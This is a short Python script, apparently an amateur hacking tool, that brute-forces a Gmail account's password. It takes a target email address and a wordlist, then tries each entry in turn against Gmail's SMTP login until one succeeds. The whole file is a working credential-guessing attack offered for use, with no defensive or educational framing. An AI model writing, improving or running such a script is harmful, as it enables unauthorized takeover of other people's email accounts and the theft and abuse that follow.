#!/usr/bin/python3
#This is coded by shahid
import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter Targets Email Address: ")
passwdfile = input("Enter The Path To The Password File: ")
file = open(passwdfile, "r")

for password in file:
    password = password.strip('\n')
    try:
            smtpserver.login(user, password)
            print(colored(" PASSWORD FOUND: %s" % password, 'green'))
            break
    except smtplib.SMTPAuthenticationError:
            print(colored("Wrong Password: " + password, 'red'))
